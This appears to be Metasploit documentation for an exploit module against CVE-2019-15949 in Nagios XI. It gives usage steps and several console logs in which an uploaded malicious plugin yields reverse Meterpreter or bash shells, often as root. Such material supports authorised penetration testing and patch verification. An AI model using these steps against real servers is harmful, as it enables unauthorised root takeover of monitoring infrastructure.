## Vulnerable Application
This module exploits a vulnerability (CVE-2019-15949) in the `getprofile.sh` script of Nagios XI before 5.6.6 in
order to execute arbitrary commands. For Nagios XI 5.2.0-5.4.13, the commands are run as the `nagios` user. For
versions 5.5.0-5.6.5 the commands are run as `root`.

The module's `check` method takes advantage of the `Msf::Exploit::Remote::HTTP::NagiosXi` mixin in order to authenticate
to the target and obtain the Nagios XI version number, which is then used to check if the target is Nagios XI prior
to 5.6.6 and therefore vulnerable. A further check is then done to see if the target is a version prior to 5.2.0, as
these versions are not supported at this time. If this is the case, the module will report that the target is vulnerable
but cannot be exploited at this time and will exit. Otherwise, the module continues.

Next, the module uploads a malicious plugin to the target and subsequently sends an HTTP GET request to `profile.php?cmd=download`.
This request downloads a system profile from the server and in the process launches the `getprofile.sh` script as `root`
via a passwordless `sudo` entry, resulting in execution of the malicious plugin as the `root` user.

For all supported targets except `Linux (cmd)`, the module uses a command stager to write the exploit to the target via
a malicious `check_ping` plugin. However, this method may not work if Nagios XI is running in a restricted Unix environment like
a minimal/custom CentOS installation. In the latter case, a malicious `check_ping` plugin will still be uploaded, however the
target must be set to `Linux (cmd)` and it is recommended to use the default `cmd/unix/reverse_bash` payload.

For vulnerable versions before 5.5.0, it may take a significant amount of time for the payload to get back (up to 5 minutes).
If the target is found to be vulnerable but the module completes without establishing a session,
try increasing the value of `WfsDelay` (the additional delay when waiting for a session).
The default value of this advanced option is 300 seconds. To check it, run `show advanced` and look for the `WsfDelay` option in the output.
Other possible solutions are changing the payload, manually setting the value of the `CMDSTAGER::FLAVOR` advanced option,
and setting the target to `Linux (cmd)` as explained above.

Valid credentials for a user with administrative privileges are required.
This module was successfully tested on Nagios XI versions 5.3.0 and 5.6.5 running on CentOS 7.

Vulnerable software for testing is available [here](https://assets.nagios.com/downloads/nagiosxi/versions.php).
Detailed installation instructions are available
[here](https://assets.nagios.com/downloads/nagiosxi/docs/Installing-Nagios-XI-Manually-on-Linux.pdf)
and an official video tutorial is available [here](https://www.youtube.com/watch?v=fBWA6t6dJ4I).

## Verification Steps
1. Start msfconsole
2. Do: `use exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce`
3. Do: `set RHOSTS [IP]`
4. Do: `set USERNAME [username for the Nagios XI account with administrative privileges]`
5. Do: `set PASSWORD [password for the Nagios XI account with administrative privileges]`
6. Do: `set target [target]`
7. Do: `set payload [payload]`
8. Do: `set LHOST [IP]`
9. Do: `exploit`

## Options
### FINISH_INSTALL
If this is set to `true`, the module will try to finish installing Nagios XI on targets where the installation has not been completed.
This includes signing the license agreement. The default value is `false`.
### PASSWORD
The password for the Nagios XI account to authenticate with.
### TARGETURI
The base path to Nagios XI. The default value is `/nagiosxi/`.
### USERNAME
The username for the Nagios XI account to authenticate with. The default value is `nagiosadmin`.

## Targets
```
Id  Name
--  ----
0   Linux (x86)
1   Linux (x64)
2   Linux (cmd)
```

## Scenarios
### Nagios XI 5.6.5 running on CentOS 7 - Linux (x86) target
```
msf6 > use exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set rhosts 192.168.1.14
rhosts => 192.168.1.14
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set lhost 192.168.1.28
lhost => 192.168.1.28
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set password nagiosadmin
password => nagiosadmin
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set target 0
target => 0
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > show options

Module options (exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   FINISH_INSTALL  false            no        If the Nagios XI installation has not been completed, try to do so
                                              . This includes signing the license agreement.
   PASSWORD        nagiosadmin      yes       Password to authenticate with
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS          192.168.1.14     yes       The target host(s), range CIDR identifier, or hosts file with synt
                                              ax 'file:<path>'
   RPORT           80               yes       The target port (TCP)
   SRVHOST         0.0.0.0          yes       The local host or network interface to listen on. This must be an
                                              address on the local machine or 0.0.0.0 to listen on all addresses
                                              .
   SRVPORT         8080             yes       The local port to listen on.
   SSL             false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI       /nagiosxi/       yes       The base path to the Nagios XI application
   URIPATH                          no        The URI to use for this exploit (default is random)
   USERNAME        nagiosadmin      yes       Username to authenticate with
   VHOST                            no        HTTP server virtual host


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.28     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux (x86)


msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > run

[*] Started reverse TCP handler on 192.168.1.28:4444
[*] Executing automatic check (disable AutoCheck to override)
[*] Attempting to authenticate to Nagios XI...
[+] Successfully authenticated to Nagios XI
[*] Target is Nagios XI with version 5.6.5
[+] The target appears to be vulnerable.
[*] Uploading malicious 'check_ping' plugin...
[*] Command Stager progress - 100.00% done (809/809 bytes)
[+] Successfully uploaded plugin.
[*] Executing plugin...
[*] Waiting up to 300 seconds for the plugin to request the final payload...
[*] Sending stage (980808 bytes) to 192.168.1.14
[*] Meterpreter session 1 opened (192.168.1.28:4444 -> 192.168.1.14:54214) at 2021-04-01 10:59:52 -0400
[*] Deleting malicious 'check_ping' plugin...
[+] Plugin deleted.

meterpreter > getuid
Server username: root @ localhost.localdomain (uid=0, gid=0, euid=0, egid=0)
```

### Nagios XI 5.6.5 running on CentOS 7 - Linux (cmd) target
```
msf6 > use exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set rhosts 192.168.1.14
rhosts => 192.168.1.14
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set lhost 192.168.1.28
lhost => 192.168.1.28
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set password nagiosadmin
password => nagiosadmin
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set target 2
target => 2
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > show options

Module options (exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   FINISH_INSTALL  false            no        If the Nagios XI installation has not been completed, try to do so
                                              . This includes signing the license agreement.
   PASSWORD        nagiosadmin      yes       Password to authenticate with
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS          192.168.1.14     yes       The target host(s), range CIDR identifier, or hosts file with synt
                                              ax 'file:<path>'
   RPORT           80               yes       The target port (TCP)
   SRVHOST         0.0.0.0          yes       The local host or network interface to listen on. This must be an
                                              address on the local machine or 0.0.0.0 to listen on all addresses
                                              .
   SRVPORT         8080             yes       The local port to listen on.
   SSL             false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI       /nagiosxi/       yes       The base path to the Nagios XI application
   URIPATH                          no        The URI to use for this exploit (default is random)
   USERNAME        nagiosadmin      yes       Username to authenticate with
   VHOST                            no        HTTP server virtual host


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.28     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   2   Linux (cmd)


msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > run

[*] Started reverse TCP handler on 192.168.1.28:4444
[*] Executing automatic check (disable AutoCheck to override)
[*] Attempting to authenticate to Nagios XI...
[+] Successfully authenticated to Nagios XI
[*] Target is Nagios XI with version 5.6.5
[+] The target appears to be vulnerable.
[*] Uploading malicious 'check_ping' plugin...
[+] Successfully uploaded plugin.
[*] Executing plugin...
[*] Waiting up to 300 seconds for the payload to connect back...
[*] Command shell session 2 opened (192.168.1.28:4444 -> 192.168.1.14:54242) at 2021-04-01 11:02:32 -0400
[*] Deleting malicious 'check_ping' plugin...
[+] Plugin deleted.

id
uid=0(root) gid=0(root) groups=0(root)

```

### Nagios XI 5.3.0 running on CentOS 7 (unfinished installation) - Linux (x64) target
```
msf6 > use exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set rhosts 192.168.1.16
rhosts => 192.168.1.16
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set lhost 192.168.1.28
lhost => 192.168.1.28
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set password nagiosxi
password => nagiosxi
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set finish_install true
finish_install => true
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > show options

Module options (exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   FINISH_INSTALL  true             no        If the Nagios XI installation has not been completed, try to do so
                                              . This includes signing the license agreement.
   PASSWORD        nagiosxi         yes       Password to authenticate with
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS          192.168.1.16     yes       The target host(s), range CIDR identifier, or hosts file with synt
                                              ax 'file:<path>'
   RPORT           80               yes       The target port (TCP)
   SRVHOST         0.0.0.0          yes       The local host or network interface to listen on. This must be an
                                              address on the local machine or 0.0.0.0 to listen on all addresses
                                              .
   SRVPORT         8080             yes       The local port to listen on.
   SSL             false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI       /nagiosxi/       yes       The base path to the Nagios XI application
   URIPATH                          no        The URI to use for this exploit (default is random)
   USERNAME        nagiosadmin      yes       Username to authenticate with
   VHOST                            no        HTTP server virtual host


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.28     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Linux (x64)


msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > run

[*] Started reverse TCP handler on 192.168.1.28:4444
[*] Executing automatic check (disable AutoCheck to override)
[*] Attempting to authenticate to Nagios XI...
[!] The target seems to be a Nagios XI application that has not been fully installed yet.
[*] Attempting to finish the Nagios XI installation on the target using the provided password. The username will be `nagiosadmin`.
[*] Attempting to authenticate to Nagios XI...
[!] The Nagios XI license agreement has not yet been signed on the target.
[*] Attempting to sign the Nagios XI license agreement...
[*] Attempting to authenticate to Nagios XI...
[+] Successfully authenticated to Nagios XI
[*] Target is Nagios XI with version 5.3.0
[+] The target appears to be vulnerable.
[*] Uploading malicious 'check_ping' plugin...
[*] Command Stager progress - 100.00% done (897/897 bytes)
[!] For NagiosXi version 5.3.0 it may take several minutes for a session to open. If the module times out, try increasing the `WfsDelay` value.
[+] Successfully uploaded plugin.
[*] Executing plugin...
[*] Waiting up to 300 seconds for the plugin to request the final payload...
[*] Sending stage (3012516 bytes) to 192.168.1.16
[*] Meterpreter session 1 opened (192.168.1.28:4444 -> 192.168.1.16:36098) at 2021-04-01 10:42:40 -0400
[*] Deleting malicious 'check_ping' plugin...
[+] Plugin deleted.

meterpreter > getuid
Server username: nagios @ localhost.localdomain (uid=1000, gid=1000, euid=1000, egid=1000)
meterpreter >
```

### Nagios XI 5.6.5 running on Ubuntu 20.04 LTS (finished installation) - Linux (x64) target
```
msf6 > use exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set RHOST 172.25.133.237
RHOST => 172.25.133.237
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set LHOST 172.25.132.121
LHOST => 172.25.132.121
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set LPORT 7712
LPORT => 7712
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set PASSWORD nagiosadmin
PASSWORD => nagiosadmin
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > show options

Module options (exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   FINISH_INSTALL  false            no        If the Nagios XI installation has not been completed, try to do so. This includes s
                                              igning the license agreement.
   PASSWORD        nagiosadmin      yes       Password to authenticate with
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS          172.25.133.237   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT           80               yes       The target port (TCP)
   SRVHOST         0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the lo
                                              cal machine or 0.0.0.0 to listen on all addresses.
   SRVPORT         8080             yes       The local port to listen on.
   SSL             false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI       /nagiosxi/       yes       The base path to the Nagios XI application
   URIPATH                          no        The URI to use for this exploit (default is random)
   USERNAME        nagiosadmin      yes       Username to authenticate with
   VHOST                            no        HTTP server virtual host


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.25.132.121   yes       The listen address (an interface may be specified)
   LPORT  7712             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Linux (x64)


msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > exploit

[*] Started reverse TCP handler on 172.25.132.121:7712
[*] Executing automatic check (disable AutoCheck to override)
[*] Attempting to authenticate to Nagios XI...
[+] Successfully authenticated to Nagios XI
[*] Target is Nagios XI with version 5.6.5
[+] The target appears to be vulnerable.
[*] Uploading malicious 'check_ping' plugin...
[*] Command Stager progress - 100.00% done (897/897 bytes)
[+] Successfully uploaded plugin.
[*] Executing plugin...
[*] Waiting up to 300 seconds for the plugin to request the final payload...
[*] Sending stage (3012516 bytes) to 172.25.133.237
[*] Meterpreter session 1 opened (172.25.132.121:7712 -> 172.25.133.237:52646) at 2021-04-13 17:39:07 -0500
[*] Deleting malicious 'check_ping' plugin...
[+] Plugin deleted.

meterpreter > getuid
Server username: root @ test-Virtual-Machine (uid=0, gid=0, euid=0, egid=0)
meterpreter > pwd
/usr/local/nagiosxi/html/includes/components/profile
meterpreter > shell
Process 3747 created.
Channel 1 created.
uname -a
Linux test-Virtual-Machine 5.4.0-70-generic #78~18.04.1-Ubuntu SMP Sat Mar 20 14:10:07 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```